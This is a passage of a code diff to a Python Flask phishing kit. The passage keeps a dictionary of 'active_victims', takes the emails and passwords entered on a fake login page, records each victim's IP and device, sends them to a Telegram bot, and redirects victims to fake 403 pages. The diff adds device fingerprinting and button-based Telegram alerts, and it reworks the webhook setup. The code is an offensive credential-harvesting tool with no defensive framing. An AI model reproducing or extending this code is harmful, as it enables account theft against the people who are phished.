         new_invite = random.randint(2, 999)
         return redirect(f"/wp-admin/invite{new_invite}/aol/403")
@@ -1595,16 +1769,17 @@ def other_login(invite_num):
                 active_victims[session_id]['email'] = email
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        user_agent = request.headers.get('User-Agent', '')
+        device = get_device_info(user_agent)
         
-        message = f"""
-🔑 <b>Other Login Attempt!</b>
+        message = f"""🔑 <b>Other Login Attempt!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🔐 <b>Password:</b> <code>{password}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
-🕒 <b>Time:</b> <code>{timestamp}</code>
-        """
-        send_telegram_message(message)
+📱 <b>Device:</b> {device}
+🕒 <b>Time:</b> <code>{timestamp}</code>"""
+        send_telegram_notification_with_buttons(message, session_id)
         
         new_invite = random.randint(2, 999)
         return redirect(f"/wp-admin/invite{new_invite}/other/403")
@@ -1615,21 +1790,10 @@ def other_login(invite_num):
 def other_403(invite_num):
     return render_template('403.html', invite_num=invite_num)
 
-def setup_telegram_webhook():
-    """Set the Telegram webhook URL"""
-    try:
-        domain = os.environ.get('DOMAIN_URL', 'https://bace-wmed.onrender.com')
-        webhook_url = f"{domain}/telegram-webhook"
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook?url={webhook_url}"
-        response = requests.get(url)
-        print(f"Webhook setup: {response.text}")
-    except Exception as e:
-        print(f"Error setting webhook: {e}")
-
 if __name__ == '__main__':
     if not os.environ.get('WERKZEUG_RUN_MAIN'):
         send_telegram_message("✅ Server started!")
-        setup_telegram_webhook()
+        ensure_webhook()
     
     app.run(
         host='0.0.0.0', 
